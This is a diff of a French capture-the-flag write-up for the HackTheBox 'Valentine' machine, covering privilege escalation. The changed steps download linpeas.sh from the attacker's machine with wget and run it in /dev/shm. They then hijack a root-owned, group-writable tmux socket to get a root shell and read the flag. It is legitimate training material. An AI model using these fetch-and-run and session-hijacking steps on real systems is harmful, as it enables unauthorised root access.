@@ -618,19 +618,21 @@ python3 -m http.server
 - dans valentine.htb
 
 ```
-cd /dev/thm
+cd /dev/shm
 wget http://<adresse tun0>:8000/linpeas.sh
+chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
 ### analyse linpeas
 
-Dans les résultats de linpeas.sh nous trouvons cette ligne surlignée en rouge+jaune:
+Dans linpeas les vulnérabilités sont classées et surlignées en couleur.
 
-```bash
-root       1065  0.0  0.1  26416  1676 ?        Ss   Nov24   0:18 /usr/bin/tmux
-    -S /.devs/dev_sess
-```
+![linpeas-legend](linpeas-legend.png)
+
+Dans nos résultats de linpeas.sh nous trouvons cette ligne surlignée en rouge+jaune:
+
+![linpeas-tmux](linpeas-tmux.png)
 
 **tmux** est un multiplexeur de terminaux qui permet d'ouvrir plusieurs sessions persistantes dans un même terminal et de s'y reconnecter même après une déconnexion.
 
@@ -642,7 +644,7 @@ Interprétation technique:
 
 Ici, le socket est :
 
-```
+```bash
 /.devs/dev_sess
 ```
 
@@ -658,23 +660,31 @@ Si on peut écrire sur ce socket, on peut :
 
 Dans le shell hype@valentine, on teste :
 
-```
+```bash
 ls -l /.devs/dev_sess
+srw-rw---- 1 root hype 0 Nov 26 00:30 /.devs/dev_sess
 ```
+
+ce qui montre que la session nous est accessible en écriture
 
 Puis on s'attache avec :
 
-```
+```bash
 tmux -S /.devs/dev_sess attach
 ```
 
 Le résultat est un prompt root :
 
-```
+```bash
 root@valentine:~#
 ```
 
 **Nous sommes devenus root.**
+
+```bash
+root@Valentine:/# cat /root/root.txt
+32ecxxxxxxxxxxxxxxxxxxxxxxxxxb08
+```
 
 
 
